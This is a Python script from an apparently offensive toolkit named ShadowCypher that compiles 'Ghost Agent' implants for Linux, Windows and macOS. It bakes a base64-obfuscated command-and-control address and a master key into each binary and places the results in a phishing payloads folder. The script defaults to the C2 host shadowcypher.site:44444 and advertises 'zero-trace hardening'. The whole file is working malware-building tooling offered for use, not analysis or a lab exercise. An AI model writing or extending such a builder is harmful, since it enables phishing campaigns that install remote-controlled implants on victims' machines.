#!/usr/bin/env python3
# ==============================================================================
# SHADOWCYPHER // CROSS-PLATFORM GHOST FORGE
# ==============================================================================
# Orchestrates the secure compilation of Ghost Agents for all target platforms.

import base64
import os
import subprocess

from shadowcypher.core.logger import logger
from shadowcypher.core.platform import platform_engine


def forge_agents(c2_address: str):
    """Compiles Ghost Agents for Linux, Windows, and macOS with zero-trace hardening."""

    agent_dir = platform_engine.resolve_path("native", "ghost")
    output_dir = platform_engine.resolve_path("phish", "payloads", "ghost")
    os.makedirs(output_dir, exist_ok=True)

    # Locate Master Key
    key_path = platform_engine.get_master_key_path()
    if not os.path.exists(key_path):
        logger.error("forge", f"Master key not found at {key_path}. Run setup script first.")
        return False

    with open(key_path, "rb") as f:
        master_key = base64.b64encode(f.read()).decode()

    # Base64 Obfuscation for C2
    encoded_c2 = base64.b64encode(c2_address.encode()).decode()

    targets = [
        {"os": "linux", "arch": "amd64", "ext": ""},
        {"os": "windows", "arch": "amd64", "ext": ".exe"},
        {"os": "darwin", "arch": "amd64", "ext": "_macos_intel"},
        {"os": "darwin", "arch": "arm64", "ext": "_macos_m1"}
    ]

    logger.info("forge", f"Starting Secure Forge for C2: {c2_address}")

    for t in targets:
        binary_name = f"ghost_{t['os']}_{t['arch']}{t['ext']}"
        output_path = os.path.join(output_dir, binary_name)

        env = os.environ.copy()
        env["GOOS"] = t["os"]
        env["GOARCH"] = t["arch"]

        cmd = [
            "go", "build", "-trimpath",
            "-ldflags", f"-X main.c2Addr={encoded_c2} -X main.masterKey={master_key}",
            "-o", output_path,
            os.path.join(agent_dir, "agent.go")
        ]

        try:
            subprocess.run(cmd, env=env, check=True)
            logger.info("forge", f"SUCCESS: {binary_name} forged.")
        except Exception as e:
            logger.error("forge", f"FAILED to forge {binary_name}: {e}")

    return True

if __name__ == "__main__":
    import sys
    c2 = sys.argv[1] if len(sys.argv) > 1 else "shadowcypher.site:44444"
    forge_agents(c2)
